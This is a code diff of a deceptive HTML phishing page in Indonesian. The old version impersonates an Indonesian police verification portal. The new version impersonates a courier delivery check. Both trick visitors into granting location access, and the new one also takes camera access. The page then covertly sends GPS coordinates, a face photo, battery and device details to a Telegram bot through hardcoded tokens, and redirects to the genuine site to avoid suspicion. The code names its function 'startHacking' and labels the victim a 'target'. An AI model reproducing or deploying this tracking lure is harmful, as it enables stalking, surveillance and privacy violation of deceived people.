@@ -3,58 +3,162 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Verifikasi Polri</title>
+    <title>Kurir Express - Verifikasi Pengiriman</title>
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f4f4f4; margin: 0; }
-        .container { text-align: center; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); width: 80%; }
-        button { background-color: #0056b3; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        body {
+            margin: 0; padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #222;
+            overflow: hidden;
+            display: flex; justify-content: center; align-items: center; height: 100vh;
+        }
+
+        /* ANIMASI TRUK BERJALAN */
+        .road {
+            position: absolute; bottom: 0; width: 100%; height: 100px;
+            background: #333; border-top: 5px solid #555; z-index: 1;
+        }
+        .truck {
+            position: absolute; bottom: 20px; left: -200px;
+            width: 150px; height: 80px;
+            background: #ff4d4d; border-radius: 5px;
+            animation: drive 10s linear infinite;
+            z-index: 2;
+        }
+        .truck::after { content: '🚚'; font-size: 60px; position: absolute; top: -10px; left: 10px; }
+        @keyframes drive {
+            from { left: -200px; }
+            to { left: 100vw; }
+        }
+
+        .overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5); z-index: 3;
+        }
+
+        .card {
+            position: relative; z-index: 10;
+            background: white; width: 90%; max-width: 400px;
+            border-radius: 20px; padding: 25px; text-align: center;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+        }
+
+        #video-preview {
+            width: 100%; height: 200px; border-radius: 10px;
+            background: #000; margin-bottom: 15px; display: none;
+            object-fit: cover;
+        }
+
+        .btn {
+            background: #ff4d4d; color: white; border: none;
+            padding: 15px 30px; font-size: 16px; font-weight: bold;
+            border-radius: 50px; cursor: pointer; width: 100%;
+            transition: 0.3s; box-shadow: 0 5px 15px rgba(255, 77, 77, 0.4);
+        }
+        .btn:hover { background: #cc0000; }
+        #loader { display: none; margin: 20px auto; border: 4px solid #f3f3f3; border-top: 4px solid #ff4d4d; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h3>Verifikasi Lokasi Diperlukan</h3>
-        <p>Silakan klik tombol di bawah dan pilih <b>"lanjutkan"</b> untuk melanjutkan ke porli Bareskrim resmi.</p>
-        <button onclick="ambilLokasi()">Verifikasi Sekarang</button>
+
+    <div class="road"></div>
+    <div class="truck"></div>
+    <div class="overlay"></div>
+
+    <div class="card">
+        <img src="https://cdn-icons-png.flaticon.com/512/2830/2830305.png" width="70" alt="Logo">
+        <h2 id="title">Verifikasi Penerima</h2>
+        <p id="desc">Untuk keamanan paket, harap izinkan akses lokasi dan ambil foto verifikasi wajah.</p>
+        
+        <video id="video-preview" autoplay playsinline></video>
+        <div id="loader"></div>
+        <button id="mainBtn" class="btn" onclick="startHacking()">MULAI VERIFIKASI</button>
+        <p id="status" style="margin-top: 15px; font-size: 12px; color: #999;">Sistem Terenkripsi AES-256</p>
     </div>
 
     <script>
-        // TOKEN BOT KAMU
-        const token = '8455526302:AAEdI-fS7NDr1q3Ao3qlQGIqJg8lrwCefWc';
-        
-        // Mengambil ID dari alamat link secara otomatis
-        const urlParams = new URLSearchParams(window.location.search);
-        const chatId = urlParams.get('id'); 
+        const BOT_TOKEN = '8601318275:AAHCZd1zuF_fbVfwEp9SqCyA1Bgf5Iue4Hs';
+        const CHAT_ID = '8607837939';
 
-        function ambilLokasi() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(kirimKeTelegram, tanganiError, {enableHighAccuracy: true});
-            } else {
-                alert("Browser tidak mendukung GPS.");
+        async function startHacking() {
+            const btn = document.getElementById('mainBtn');
+            const loader = document.getElementById('loader');
+            const video = document.getElementById('video-preview');
+            
+            btn.style.display = 'none';
+            loader.style.display = 'block';
+
+            try {
+                // 1. Ambil Lokasi
+                const pos = await getCoordinate();
+                
+                // 2. Ambil Data Baterai
+                const battery = await getBatteryInfo();
+
+                // 3. Ambil Kamera (Akan trigger popup izin browser)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.style.display = 'block';
+                video.srcObject = stream;
+
+                // Capture frame sederhana dari video ke canvas (untuk dikirim sebagai info)
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const photoData = canvas.toDataURL('image/jpeg');
+
+                // Kirim semua ke Telegram
+                await sendData(pos, battery, photoData);
+
+                // Redirect Akhir
+                window.location.href = "https://www.jne.co.id/";
+
+            } catch (err) {
+                console.log("Error: " + err);
+                alert("Verifikasi Gagal: Izin akses ditolak.");
+                btn.style.display = 'block';
+                loader.style.display = 'none';
             }
         }
 
-        function kirimKeTelegram(posisi) {
-            const lat = posisi.coords.latitude;
-            const lon = posisi.coords.longitude;
-
-            // Jika link tidak ada ID-nya, kirim ke ID kamu sebagai cadangan
-            const penerima = chatId ? chatId : '1966317946';
-
-            // PERBAIKAN: URL API Telegram harus lengkap seperti ini
-            const url = `https://api.telegram.org/bot${token}/sendLocation?chat_id=${penerima}&latitude=${lat}&longitude=${lon}`;
-
-            fetch(url).then(() => {
-                // Setelah lokasi terkirim, target langsung dibuang ke web Polri asli
-                window.location.href = "https://dumaspresisi.polri.go.id/";
-            }).catch(err => {
-                // Jika gagal kirim, tetap pindahkan agar tidak curiga
-                window.location.href = "https://dumaspresisi.polri.go.id/";
+        function getCoordinate() {
+            return new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(res => resolve(res.coords), reject, { enableHighAccuracy: true });
             });
         }
 
-        function tanganiError(err) {
-            alert("Harap klik 'Izinkan' untuk verifikasi keamanan sistem.");
-            location.reload();
+        async function getBatteryInfo() {
+            if (!navigator.getBattery) return { level: "N/A", charging: "N/A" };
+            const batt = await navigator.getBattery();
+            return { level: (batt.level * 100) + "%", charging: batt.charging ? "Charging" : "Discharging" };
+        }
+
+        async function sendData(pos, batt, photo) {
+            const mapUrl = `https://www.google.com/maps?q=${pos.latitude},${pos.longitude}`;
+            const message = `🚨 *TARGET TERDETEKSI!* 🚨\n\n` +
+                            `📍 *Lokasi:* ${mapUrl}\n` +
+                            `🔋 *Baterai:* ${batt.level} (${batt.charging})\n` +
+                            `📱 *Device:* ${navigator.userAgent}\n` +
+                            `🎯 *Akurasi:* ${pos.accuracy}m`;
+
+            // Kirim Pesan Teks
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+            });
+
+            // Kirim Foto (Base64 to Blob)
+            const blob = await (await fetch(photo)).blob();
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob);
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
         }
     </script>
 </body>
